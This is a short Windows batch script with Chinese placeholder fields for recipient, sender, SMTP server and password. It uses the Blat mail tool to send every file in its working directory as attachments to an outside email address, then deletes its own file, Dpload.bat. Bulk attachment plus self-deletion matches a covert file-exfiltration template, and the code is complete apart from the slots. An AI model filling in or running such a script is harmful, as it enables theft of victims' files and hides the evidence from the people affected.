@echo off
set body="New Upload Files"
set s="New Upload Files"
set t=#收件邮箱#
set f=#发件邮箱#
set pw=#smtp密码#
set attach=*.*
Blat -body %body% -s %s% -attach %attach% -t %t% -server #smtp服务器# -f %f% -u %f% -pw %pw%
del Dpload.bat